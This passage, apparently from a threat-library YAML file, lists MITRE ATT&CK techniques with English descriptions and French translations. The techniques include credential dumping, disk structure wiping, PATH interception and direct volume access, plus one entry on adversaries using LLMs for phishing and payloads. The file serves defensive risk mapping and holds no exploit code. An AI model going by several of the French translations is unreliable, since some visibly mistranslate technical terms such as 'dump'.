          \ le protocole sp\xE9cifi\xE9 dans le second param\xE8tre \xE0 <code>LDAP://</code>,\
          \ au lieu du nom <code>script\_:</code> qui pourrait \xEAtre utilis\xE9\
          \ pour r\xE9f\xE9rencer du code distant via HTTP(S).https\_://attack.mitre.org/techniques/T1216/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1597.002
    ref_id: T1597.002
    name: Purchase Technical Data
    description: "Adversaries may purchase technical information about victims that\
      \ can be used during targeting. Information about victims may be available for\
      \ purchase within reputable private sources and databases, such as paid subscriptions\
      \ to feeds of scan databases or other data aggregation services. Adversaries\
      \ may also purchase information from less-reputable sources such as dark web\
      \ or cybercrime blackmarkets.\n\nAdversaries may purchase information about\
      \ their already identified targets, or use purchased data to discover opportunities\
      \ for successful breaches. Threat actors may gather various technical details\
      \ from purchased data, including but not limited to employee contact information,\
      \ credentials, or specifics regarding a victim\u2019s infrastructure.(Citation:\
      \ ZDNET Selling Data) Information from these sources may reveal opportunities\
      \ for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)\
      \ or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),\
      \ establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)\
      \ or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or\
      \ initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)\
      \ or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).\nhttps://attack.mitre.org/techniques/T1597/002"
    translations:
      fr:
        name: "Donn\xE9es techniques d'achat"
        description: "Les adversaires peuvent acheter des informations techniques\
          \ sur les victimes qui peuvent \xEAtre utilis\xE9es lors du ciblage. Des\
          \ informations sur les victimes peuvent \xEAtre disponibles \xE0 l'achat\
          \ dans des sources priv\xE9es et bases de donn\xE9es r\xE9put\xE9es, telles\
          \ que des abonnements payants \xE0 des flux de donn\xE9es de scan ou d'autres\
          \ services d'agr\xE9gation de donn\xE9es. Les adversaires peuvent \xE9galement\
          \ acheter des informations aupr\xE8s de sources moins fiables telles que\
          \ le dark web ou les march\xE9s noirs de la cybercriminalit\xE9.\n\nLes\
          \ adversaires peuvent acheter des informations sur leurs cibles d\xE9j\xE0\
          \ identifi\xE9es, ou utiliser ces donn\xE9es pour d\xE9couvrir des opportunit\xE9\
          s de r\xE9ussite dans les br\xE8ches. Les acteurs malveillants peuvent recueillir\
          \ divers d\xE9tails techniques \xE0 partir de donn\xE9es achet\xE9es, y\
          \ compris, mais sans s'y limiter, les coordonn\xE9es des employ\xE9s, les\
          \ identifiants ou des d\xE9tails concernant l'infrastructure de la victime.\
          \ (Citation : Donn\xE9es de vente ZDNET) Les informations provenant de ces\
          \ sources peuvent r\xE9v\xE9ler d'autres formes de reconnaissance (ex :\
          \ [Phishing for Information](https://attack.mitre.org/techniques/T1598)\
          \ ou [Rechercher des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)),\
          \ l'\xE9tablissement de ressources op\xE9rationnelles (ex. : [D\xE9velopper\
          \ des capacit\xE9s](https://attack.mitre.org/techniques/T1587) ou [Obtenir\
          \ des capacit\xE9s](https://attack.mitre.org/techniques/T1588)), et/ou un\
          \ acc\xE8s initial (ex : [Distance externe Services](https://attack.mitre.org/techniques/T1133)\
          \ ou [Comptes valides](https://attack.mitre.org/techniques/T1078)).https\_\
          ://attack.mitre.org/techniques/T1597/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003
    ref_id: T1003
    name: OS Credential Dumping
    description: 'Adversaries may attempt to dump credentials to obtain account login
      and credential material, normally in the form of a hash or a clear text password.
      Credentials can be obtained from OS caches, memory, or structures.(Citation:
      Brining MimiKatz to Unix) Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008)
      and access restricted information.


      Several of the tools mentioned in associated sub-techniques may be used by both
      adversaries and professional security testers. Additional custom tools likely
      exist as well.

      https://attack.mitre.org/techniques/T1003'
    translations:
      fr:
        name: "Dumping des cr\xE9dentials OS"
        description: "Les adversaires peuvent tenter de supprimer des identifiants\
          \ pour obtenir des identifiants de compte et du mat\xE9riel de r\xE9f\xE9\
          rence, g\xE9n\xE9ralement sous forme de hachage ou de mot de passe en texte\
          \ clair. Les identifiants peuvent \xEAtre obtenus \xE0 partir de caches,\
          \ de m\xE9moire ou de structures du syst\xE8me d'exploitation. (Citation\
          \ : Apporter MimiKatz \xE0 Unix) Les identifiants peuvent alors \xEAtre\
          \ utilis\xE9s pour effectuer un [Mouvement Lat\xE9ral](https://attack.mitre.org/tactics/TA0008)\
          \ et acc\xE9der \xE0 des informations restreintes.\n\nPlusieurs des outils\
          \ mentionn\xE9s dans les sous-techniques associ\xE9es peuvent \xEAtre utilis\xE9\
          s \xE0 la fois par des adversaires et des testeurs de s\xE9curit\xE9 professionnels.\
          \ D'autres outils personnalis\xE9s existent probablement \xE9galement. https\_\
          ://attack.mitre.org/techniques/T1003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1129
    ref_id: T1129
    name: Shared Modules
    description: 'Adversaries may execute malicious payloads via loading shared modules.
      Shared modules are executable files that are loaded into processes to provide
      access to reusable code, such as specific custom functions or invoking OS API
      functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).


      Adversaries may use this functionality as a way to execute arbitrary payloads
      on a victim system. For example, adversaries can modularize functionality of
      their malware into shared objects that perform various functions such as managing
      C2 network communications or execution of specific actions on objective.


      The Linux & macOS module loader can load and execute shared objects from arbitrary
      local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen`
      and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib`
      files.(Citation: Apple Dev Dynamic Libraries)(Citation: Linux Shared Libraries)(Citation:
      RotaJakiro 2021 netlab360 analysis)(Citation: Unit42 OceanLotus 2017)


      The Windows module loader can be instructed to load DLLs from arbitrary local
      paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality
      resides in `NTDLL.dll` and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106)
      which is called from functions like `LoadLibrary` at run time.(Citation: Microsoft
      DLL)

      https://attack.mitre.org/techniques/T1129'
    translations:
      fr:
        name: "Modules partag\xE9s"
        description: "Les adversaires peuvent ex\xE9cuter des charges utiles malveillantes\
          \ en chargeant des modules partag\xE9s. Les modules partag\xE9s sont des\
          \ fichiers ex\xE9cutables qui sont charg\xE9s dans des processus pour permettre\
          \ l'acc\xE8s \xE0 du code r\xE9utilisable, comme des fonctions personnalis\xE9\
          es sp\xE9cifiques ou l'invocation de fonctions API du syst\xE8me d'exploitation\
          \ (c'est-\xE0-dire [API native](https://attack.mitre.org/techniques/T1106)).\n\
          \nLes adversaires peuvent utiliser cette fonctionnalit\xE9 pour ex\xE9cuter\
          \ des charges utiles arbitraires sur un syst\xE8me victime. Par exemple,\
          \ les adversaires peuvent modulariser la fonctionnalit\xE9 de leur malware\
          \ en objets partag\xE9s qui remplissent diverses fonctions telles que la\
          \ gestion des communications r\xE9seau C2 ou l'ex\xE9cution d'actions sp\xE9\
          cifiques sur l'objectif.\n\nLe chargeur de modules Linux & macOS peut charger\
          \ et ex\xE9cuter des objets partag\xE9s \xE0 partir de chemins locaux arbitraires.\
          \ Cette fonctionnalit\xE9 r\xE9side dans 'dlfcn.h' dans des fonctions telles\
          \ que 'dlopen' et 'dlsym'. Bien que macOS puisse ex\xE9cuter des fichiers\
          \ '.so', la pratique courante utilise des fichiers '.dylib'. (Citation :\
          \ Biblioth\xE8ques dynamiques Apple Dev)(Citation : Biblioth\xE8ques partag\xE9\
          es Linux)(Citation : analyse netlab360 de RotaJakiro 2021)(Citation : Unit42\
          \ OceanLotus 2017)\n\nLe chargeur de modules Windows peut \xEAtre instruit\
          \ pour charger des DLL \xE0 partir de chemins locaux arbitraires et de chemins\
          \ r\xE9seau arbitraires de la Convention universelle de nommage (UNC). Cette\
          \ fonctionnalit\xE9 r\xE9side dans \xAB NTDLL.dll \xBB et fait partie de\
          \ l'API native de Windows(https://attack.mitre.org/techniques/T1106) qui\
          \ est appel\xE9e \xE0 partir de fonctions comme \xAB LoadLibrary \xBB \xE0\
          \ l'ex\xE9cution. (Citation : Microsoft DLL) https://attack.mitre.org/techniques/T1129"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1602
    ref_id: T1602
    name: Data from Configuration Repository
    description: 'Adversaries may collect data related to managed devices from configuration
      repositories. Configuration repositories are used by management systems in order
      to configure, manage, and control data on remote systems. Configuration repositories
      may also facilitate remote access and administration of devices.


      Adversaries may target these repositories in order to collect large quantities
      of sensitive system administration data. Data from configuration repositories
      may be exposed by various protocols and software and can store a wide variety
      of data, much of which may align with adversary Discovery objectives.(Citation:
      US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)

      https://attack.mitre.org/techniques/T1602'
    translations:
      fr:
        name: "Donn\xE9es du d\xE9p\xF4t de configuration"
        description: "Les adversaires peuvent collecter des donn\xE9es li\xE9es aux\
          \ dispositifs g\xE9r\xE9s \xE0 partir de d\xE9p\xF4ts de configuration.\
          \ Les d\xE9p\xF4ts de configuration sont utilis\xE9s par les syst\xE8mes\
          \ de gestion afin de configurer, g\xE9rer et contr\xF4ler les donn\xE9es\
          \ sur les syst\xE8mes distants. Les d\xE9p\xF4ts de configuration peuvent\
          \ \xE9galement faciliter l'acc\xE8s et l'administration \xE0 distance des\
          \ appareils.\n\nLes adversaires peuvent cibler ces d\xE9p\xF4ts afin de\
          \ collecter de grandes quantit\xE9s de donn\xE9es sensibles d'administration\
          \ syst\xE8me. Les donn\xE9es provenant de d\xE9p\xF4ts de configuration\
          \ peuvent \xEAtre expos\xE9es par divers protocoles et logiciels et peuvent\
          \ stocker une grande vari\xE9t\xE9 de donn\xE9es, dont beaucoup peuvent\
          \ correspondre aux objectifs de Discovery adverses. (Citation : US-CERT-TA18-106A)(Citation\
          \ : US-CERT TA17-156A Abus SNMP 2017)https://attack.mitre.org/techniques/T1602"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1561.002
    ref_id: T1561.002
    name: Disk Structure Wipe
    description: "Adversaries may corrupt or wipe the disk data structures on a hard\
      \ drive necessary to boot a system; targeting specific critical systems or in\
      \ large numbers in a network to interrupt availability to system and network\
      \ resources. \n\nAdversaries may attempt to render the system unable to boot\
      \ by overwriting critical data located in structures such as the master boot\
      \ record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation:\
      \ FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation:\
      \ Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained\
      \ in disk structures may include the initial executable code for loading an\
      \ operating system or the location of the file system partitions on disk. If\
      \ this information is not present, the computer will not be able to load an\
      \ operating system during the boot process, leaving the computer unavailable.\
      \ [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be\
      \ performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001)\
      \ if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may\
      \ reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
      \ commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact\
      \ on the target organization, malware designed for destroying disk structures\
      \ may have worm-like features to propagate across a network by leveraging other\
      \ techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078),\
      \ [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows\
      \ Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec\
      \ Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon\
      \ Nov 2016)(Citation: Kaspersky StoneDrill 2017)\nhttps://attack.mitre.org/techniques/T1561/002"
    translations:
      fr:
        name: Effacement de la structure du disque
        description: "Les adversaires peuvent corrompre ou effacer les structures\
          \ de donn\xE9es du disque sur un disque dur n\xE9cessaires au d\xE9marrage\
          \ d'un syst\xE8me ; ciblant des syst\xE8mes critiques sp\xE9cifiques ou\
          \ en grand nombre dans un r\xE9seau pour interrompre la disponibilit\xE9\
          \ des ressources syst\xE8me et r\xE9seau. \n\nLes adversaires peuvent tenter\
          \ de rendre le syst\xE8me incapable de d\xE9marrer en \xE9crasant des donn\xE9\
          es critiques situ\xE9es dans des structures telles que l'enregistrement\
          \ de d\xE9marrage ma\xEEtre (MBR) ou la table de partition. (Citation :\
          \ Symantec Shamoon 2012)(Citation : FireEye Shamoon, novembre 2016)(Citation\
          \ : Palo Alto Shamoon, novembre 2016)(Citation : Kaspersky StoneDrill 2017)(Citation\
          \ : Unit\xE9 42 Shamoon3 2018) Les donn\xE9es contenues dans les structures\
          \ de disque peuvent inclure le code ex\xE9cutable initial pour charger un\
          \ syst\xE8me d'exploitation ou l'emplacement des partitions du syst\xE8\
          me de fichiers sur le disque. Si cette information n'est pas pr\xE9sente,\
          \ l'ordinateur ne pourra pas charger un syst\xE8me d'exploitation pendant\
          \ le processus de d\xE9marrage, laissant l'ordinateur indisponible. [Effacement\
          \ de la structure du disque](https://attack.mitre.org/techniques/T1561/002)\
          \ peut \xEAtre effectu\xE9 isol\xE9ment, ou avec [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001)\
          \ si tous les secteurs d'un disque sont effac\xE9s.\n\nSur un p\xE9riph\xE9\
          rique r\xE9seau, les adversaires peuvent reformater le syst\xE8me de fichiers\
          \ \xE0 l'aide de commandes [CLI du dispositif r\xE9seau](https://attack.mitre.org/techniques/T1059/008)\
          \ telles que \xAB formater \xBB. (Citation : format_cmd_cisco)\n\nPour maximiser\
          \ l'impact sur l'organisation cible, les logiciels malveillants con\xE7\
          us pour d\xE9truire des structures de disque peuvent disposer de fonctionnalit\xE9\
          s de type ver \xE0 propager sur un r\xE9seau en utilisant d'autres techniques\
          \ telles que [Comptes valides](https://attack.mitre.org/techniques/T1078),\
          \ [Dumping des identifiants d'exploitation](https://attack.mitre.org/techniques/T1003)\
          \ et [Partages d'administration SMB/Windows](https://attack.mitre.org/techniques/T1021/002).\
          \ (Citation : Symantec Shamoon 2012)(Citation : FireEye Shamoon, novembre\
          \ 2016)(Citation : Palo Alto Shamoon, novembre 2016)(Citation : Kaspersky\
          \ StoneDrill 2017) https://attack.mitre.org/techniques/T1561/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1498.001
    ref_id: T1498.001
    name: Direct Network Flood
    description: 'Adversaries may attempt to cause a denial of service (DoS) by directly
      sending a high-volume of network traffic to a target. This DoS attack may also
      reduce the availability and functionality of the targeted system(s) and network.
      [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when
      one or more systems are used to send a high-volume of network packets towards
      the targeted service''s network. Almost any network protocol may be used for
      flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful
      protocols such as TCP can be used as well.


      Botnets are commonly used to conduct network flooding attacks against networks
      and services. Large botnets can generate a significant amount of traffic from
      systems spread across the global Internet. Adversaries may have the resources
      to build out and control their own botnet infrastructure or may rent time on
      an existing botnet to conduct an attack. In some of the worst cases for distributed
      DoS (DDoS), so many systems are used to generate the flood that each one only
      needs to send out a small amount of traffic to produce enough volume to saturate
      the target network. In such circumstances, distinguishing DDoS traffic from
      legitimate clients becomes exceedingly difficult. Botnets have been used in
      some of the most high-profile DDoS flooding attacks, such as the 2012 series
      of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March
      2016)

      https://attack.mitre.org/techniques/T1498/001'
    translations:
      fr:
        name: "Inondation directe du r\xE9seau"
        description: "Les adversaires peuvent tenter de provoquer un d\xE9ni de service\
          \ (DoS) en envoyant directement un volume \xE9lev\xE9 de trafic r\xE9seau\
          \ \xE0 une cible. Cette attaque DoS peut \xE9galement r\xE9duire la disponibilit\xE9\
          \ et la fonctionnalit\xE9 du ou des syst\xE8mes et du r\xE9seau cibl\xE9\
          s. [Inondation directe du r\xE9seau](https://attack.mitre.org/techniques/T1498/001)s\
          \ sont lorsque un ou plusieurs syst\xE8mes sont utilis\xE9s pour envoyer\
          \ un volume \xE9lev\xE9 de paquets r\xE9seau vers le r\xE9seau du service\
          \ cibl\xE9. Presque tous les protocoles r\xE9seau peuvent \xEAtre utilis\xE9\
          s pour l'inondation. Des protocoles sans \xE9tat tels que UDP ou ICMP sont\
          \ couramment utilis\xE9s, mais des protocoles \xE0 \xE9tat comme TCP peuvent\
          \ \xE9galement \xEAtre utilis\xE9s.\n\nLes botnets sont couramment utilis\xE9\
          s pour mener des attaques de saturation de r\xE9seau contre des r\xE9seaux\
          \ et des services. Les grands botnets peuvent g\xE9n\xE9rer une quantit\xE9\
          \ significative de trafic provenant de syst\xE8mes r\xE9partis sur l'Internet\
          \ mondial. Les adversaires peuvent disposer des ressources pour construire\
          \ et contr\xF4ler leur propre infrastructure de botnet ou louer du temps\
          \ sur un botnet existant pour mener une attaque. Dans certains des pires\
          \ cas pour les DoS distribu\xE9s (DDoS), tellement de syst\xE8mes sont utilis\xE9\
          s pour g\xE9n\xE9rer le flood que chacun n'a besoin que d'envoyer une petite\
          \ quantit\xE9 de trafic pour produire suffisamment de volume afin de saturer\
          \ le r\xE9seau cible. Dans de telles circonstances, distinguer le trafic\
          \ DDoS des clients l\xE9gitimes devient extr\xEAmement difficile. Les botnets\
          \ ont \xE9t\xE9 utilis\xE9s dans certaines des attaques DDoS les plus m\xE9\
          diatis\xE9es, comme la s\xE9rie d'incidents de 2012 visant de grandes banques\
          \ am\xE9ricaines. (Citation : USNYAG IranianBotnet mars 2016)https://attack.mitre.org/techniques/T1498/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.007
    ref_id: T1574.007
    name: Path Interception by PATH Environment Variable
    description: "Adversaries may execute their own malicious payloads by hijacking\
      \ environment variables used to load libraries. The PATH environment variable\
      \ contains a list of directories (User and System) that the OS searches sequentially\
      \ through in search of the binary that was called from a script or the command\
      \ line. \n\nAdversaries can place a malicious program in an earlier entry in\
      \ the list of directories stored in the PATH environment variable, resulting\
      \ in the operating system executing the malicious binary rather than the legitimate\
      \ binary when it searches sequentially through that PATH listing.\n\nFor example,\
      \ on Windows if an adversary places a malicious program named \"net.exe\" in\
      \ `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe`\
      \ in the PATH environment variable, when \"net\" is executed from the command-line\
      \ the `C:\\example path` will be called instead of the system's legitimate executable\
      \ at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely\
      \ on the PATH environment variable to determine the locations that are searched\
      \ when the path for the program is not given, such as executing programs from\
      \ a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation:\
      \ ExpressVPN PATH env Windows 2021)\n\nAdversaries may also directly modify\
      \ the $PATH variable specifying the directories to be searched.  An adversary\
      \ can modify the `$PATH` variable to point to a directory they have write access.\
      \ When a program using the $PATH variable is called, the OS searches the specified\
      \ directory and executes the malicious binary. On macOS, this can also be performed\
      \ through modifying the $HOME variable. These variables can be modified using\
      \ the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004),\
      \ or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC\
      \ linux malware 2023)(Citation: nixCraft macOS PATH variables)(Citation: Elastic\
      \ Rules macOS launchctl 2022)\nhttps://attack.mitre.org/techniques/T1574/007"
    translations:
      fr:
        name: Interception de chemin par variable d'environnement PATH
        description: "Les adversaires peuvent ex\xE9cuter leurs propres charges utiles\
          \ malveillantes en d\xE9tournant les variables d'environnement utilis\xE9\
          es pour charger les biblioth\xE8ques. La variable d'environnement PATH contient\
          \ une liste d'annuaires (Utilisateur et Syst\xE8me) que le syst\xE8me d'exploitation\
          \ effectue une recherche s\xE9quentielle \xE0 la recherche du binaire appel\xE9\
          \ depuis un script ou la ligne de commande. \n\nLes adversaires peuvent\
          \ placer un programme malveillant dans une entr\xE9e ant\xE9rieure de la\
          \ liste des r\xE9pertoires stock\xE9s dans la variable d'environnement PATH,\
          \ ce qui fait que le syst\xE8me d'exploitation ex\xE9cute le binaire malveillant\
          \ plut\xF4t que le binaire l\xE9gitime lorsqu'il effectue une recherche\
          \ s\xE9quentielle dans cette liste PATH.\n\nPar exemple, sous Windows, si\
          \ un adversaire place un programme malveillant nomm\xE9 \xAB net.exe \xBB\
          \ dans \xAB C\_:\\example path \xBB, qui par d\xE9faut pr\xE9c\xE8de \xAB\
          \ C\_:\\Windows\\system32\\net.exe \xBB dans la variable d'environnement\
          \ PATH, lorsque \xAB net \xBB est ex\xE9cut\xE9 depuis la ligne de commande,\
          \ le \xAB chemin C\_:\\example \xBB sera appel\xE9 \xE0 la place de l'ex\xE9\
          cutable l\xE9gitime du syst\xE8me \xE0 \xAB C\_:\\Windows\\system32\\net.exe\
          \ \xBB. Certaines m\xE9thodes d'ex\xE9cution d'un programme reposent sur\
          \ la variable d'environnement PATH pour d\xE9terminer les emplacements recherch\xE9\
          s lorsque le chemin du programme n'est pas donn\xE9, comme l'ex\xE9cution\
          \ de programmes depuis un [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).\
          \ (Citation : ExpressVPN PATH env Windows 2021)\n\nLes adversaires peuvent\
          \ \xE9galement modifier directement la variable $PATH sp\xE9cifiant les\
          \ annuaires \xE0 rechercher.  Un adversaire peut modifier la variable \xAB\
          \ $PATH \xBB pour pointer vers un r\xE9pertoire auquel il a acc\xE8s en\
          \ \xE9criture. Lorsqu'un programme utilisant la variable $PATH est appel\xE9\
          , le syst\xE8me d'exploitation recherche le r\xE9pertoire sp\xE9cifi\xE9\
          \ et ex\xE9cute le binaire malveillant. Sur macOS, cela peut \xE9galement\
          \ \xEAtre r\xE9alis\xE9 en modifiant la variable $HOME. Ces variables peuvent\
          \ \xEAtre modifi\xE9es via la ligne de commande, launchctl, [Modification\
          \ de configuration du shell Unix](https://attack.mitre.org/techniques/T1546/004),\
          \ ou en modifiant le contenu du dossier '/etc/paths.d'. (Citation : uptycs\
          \ Fake POC Linux malware 2023)(Citation : variables nixCraft macOS PATH)(Citation\
          \ : Elastic Rules macOS launchctl 2022)https://attack.mitre.org/techniques/T1574/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1213.002
    ref_id: T1213.002
    name: Sharepoint
    description: 'Adversaries may leverage the SharePoint repository as a source to
      mine valuable information. SharePoint will often contain useful information
      for an adversary to learn about the structure and functionality of the internal
      network and systems. For example, the following is a list of example information
      that may hold potential value to an adversary and may also be found on SharePoint:


      * Policies, procedures, and standards

      * Physical / logical network diagrams

      * System architecture diagrams

      * Technical system documentation

      * Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552))

      * Work / project schedules

      * Source code snippets

      * Links to network shares and other internal resources

      https://attack.mitre.org/techniques/T1213/002'
    translations:
      fr:
        name: SharePoint
        description: "Les adversaires peuvent utiliser le d\xE9p\xF4t SharePoint comme\
          \ source pour exploiter des informations pr\xE9cieuses. SharePoint contiendra\
          \ souvent des informations utiles pour qu'un adversaire puisse apprendre\
          \ la structure et la fonctionnalit\xE9 du r\xE9seau et des syst\xE8mes internes.\
          \ Par exemple, voici une liste d'informations d'exemple pouvant avoir une\
          \ valeur potentielle pour un adversaire et que l'on peut \xE9galement trouver\
          \ sur SharePoint :\n\n* Politiques, proc\xE9dures et normes* Diagrammes\
          \ r\xE9seau physiques / logiques* Diagrammes d'architecture syst\xE8me*\
          \ Documentation technique du syst\xE8me* Identifiants de test / d\xE9veloppement\
          \ (c'est-\xE0-dire [identifiants non s\xE9curis\xE9s](https://attack.mitre.org/techniques/T1552))*\
          \ Plannings de travail / projet* Extraits de code source* Liens vers des\
          \ partages r\xE9seau et autres informations internes resourceshttps://attack.mitre.org/techniques/T1213/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1006
    ref_id: T1006
    name: Direct Volume Access
    description: 'Adversaries may directly access a volume to bypass file access controls
      and file system monitoring. Windows allows programs to have direct access to
      logical volumes. Programs with direct access may read and write files directly
      from the drive by analyzing file system data structures. This technique may
      bypass Windows file access controls as well as file system monitoring tools.
      (Citation: Hakobyan 2009)


      Utilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation:
      Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party
      utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404))
      to create shadow copies or backups of data from system volumes.(Citation: LOLBAS
      Esentutl)

      https://attack.mitre.org/techniques/T1006'
    translations:
      fr:
        name: "Acc\xE8s direct aux volumes"
        description: "Les adversaires peuvent acc\xE9der directement \xE0 un volume\
          \ pour contourner les contr\xF4les d'acc\xE8s aux fichiers et la surveillance\
          \ du syst\xE8me de fichiers. Windows permet aux programmes d'avoir un acc\xE8\
          s direct aux volumes logiques. Les programmes ayant un acc\xE8s direct peuvent\
          \ lire et \xE9crire des fichiers directement depuis le disque en analysant\
          \ les structures de donn\xE9es du syst\xE8me de fichiers. Cette technique\
          \ peut contourner les contr\xF4les d'acc\xE8s aux fichiers Windows ainsi\
          \ que les outils de surveillance du syst\xE8me de fichiers. (Citation :\
          \ Hakobyan 2009)\n\nDes utilitaires, tels que \xAB NinjaCopy \xBB, existent\
          \ pour effectuer ces actions dans PowerShell. (Citation : Github PowerSploit\
          \ Ninjacopy) Les adversaires peuvent \xE9galement utiliser des utilitaires\
          \ int\xE9gr\xE9s ou tiers (tels que 'vssadmin', 'wbadmin' et [esentutl](https://attack.mitre.org/software/S0404))\
          \ pour cr\xE9er des copies fant\xF4mes ou des sauvegardes de donn\xE9es\
          \ provenant de volumes syst\xE8me. (Citation : LOLBAS Esentutl) https://attack.mitre.org/techniques/T1006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.007
    ref_id: T1588.007
    name: Artificial Intelligence
    description: "Adversaries may obtain access to generative artificial intelligence\
      \ tools, such as large language models (LLMs), to aid various techniques during\
      \ targeting. These tools may be used to inform, bolster, and enable a variety\
      \ of malicious tasks, including conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043),\
      \ creating basic scripts, assisting social engineering, and even developing\
      \ payloads.(Citation: MSFT-AI) \n\nFor example, by utilizing a publicly available\
      \ LLM an adversary is essentially outsourcing or automating certain tasks to\
      \ the tool. Using AI, the adversary may draft and generate content in a variety\
      \ of written languages to be used in [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing\
      \ for Information](https://attack.mitre.org/techniques/T1598) campaigns. The\
      \ same publicly available tool may further enable vulnerability or other offensive\
      \ research supporting [Develop Capabilities](https://attack.mitre.org/techniques/T1587).\
      \ AI tools may also automate technical tasks by generating, refining, or otherwise\
      \ enhancing (e.g., [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027))\
      \ malicious scripts and payloads.(Citation: OpenAI-CTI) Finally, AI-generated\
      \ text, images, audio, and video may be used for fraud, [Impersonation](https://attack.mitre.org/techniques/T1656),\
      \ and other malicious activities.(Citation: Google-Vishing24)(Citation: IC3-AI24)(Citation:\
      \ WSJ-Vishing-AI24)\nhttps://attack.mitre.org/techniques/T1588/007"
    translations:
      fr:
        name: Intelligence artificielle
        description: "Les adversaires peuvent acc\xE9der \xE0 des outils d'intelligence\
          \ artificielle g\xE9n\xE9rative, tels que de grands mod\xE8les de langage\
          \ (LLM), pour faciliter diverses techniques lors du ciblage. Ces outils\
          \ peuvent \xEAtre utilis\xE9s pour informer, renforcer et permettre diverses\
          \ t\xE2ches malveillantes, notamment la r\xE9alisation de [Reconnaissance](https://attack.mitre.org/tactics/TA0043),\
          \ la cr\xE9ation de scripts de base, l'assistance \xE0 l'ing\xE9nierie sociale,\
          \ et m\xEAme le d\xE9veloppement de charges utiles. (Citation : MSFT-AI)\
          \ \n\nPar exemple, en utilisant un LLM accessible publiquement, un adversaire\
          \ externalise ou automatise essentiellement certaines t\xE2ches vers l'outil.\
          \ Gr\xE2ce \xE0 l'IA, l'adversaire peut r\xE9diger et g\xE9n\xE9rer du contenu\
          \ dans une vari\xE9t\xE9 de langages \xE9crits destin\xE9s \xE0 \xEAtre\
          \ utilis\xE9s dans les campagnes [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing\
          \ for Information](https://attack.mitre.org/techniques/T1598). Le m\xEA\
          me outil disponible au public peut encore permettre la vuln\xE9rabilit\xE9\
          \ ou d'autres recherches offensives soutenant [D\xE9velopper des Capacit\xE9\
          s](https://attack.mitre.org/techniques/T1587). Les outils d'IA peuvent \xE9\
          galement automatiser des t\xE2ches techniques en g\xE9n\xE9rant, affinant\
          \ ou am\xE9liorant (par exemple, [Fichiers ou informations obscurcis](https://attack.mitre.org/techniques/T1027))\
          \ scripts et charges utiles malveillants. (Citation : OpenAI-CTI) Enfin,\
          \ le texte, images, audio et vid\xE9o g\xE9n\xE9r\xE9s par IA peuvent \xEA\
          tre utilis\xE9s pour la fraude, l'[usurpation d'identit\xE9](https://attack.mitre.org/techniques/T1656)\
          \ et d'autres activit\xE9s malveillantes. (Citation : Google-Vishing24)(Citation\
          \ : IC3-AI24)(Citation : WSJ-Vishing-AI24) https://attack.mitre.org/techniques/T1588/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1666
    ref_id: T1666
    name: Modify Cloud Resource Hierarchy
    description: "Adversaries may attempt to modify hierarchical structures in infrastructure-as-a-service\
      \ (IaaS) environments in order to evade defenses.  \n\nIaaS environments often\
      \ group resources into a hierarchy, enabling improved resource management and\
      \ application of policies to relevant groups. Hierarchical structures differ\
      \ among cloud providers. For example, in AWS environments, multiple accounts\
      \ can be grouped under a single organization, while in Azure environments, multiple\
      \ subscriptions can be grouped under a single management group.(Citation: AWS\
      \ Organizations)(Citation: Microsoft Azure Resources)\n\nAdversaries may add,\
      \ delete, or otherwise modify resource groups within an IaaS hierarchy. For\
      \ example, in Azure environments, an adversary who has gained access to a Global\
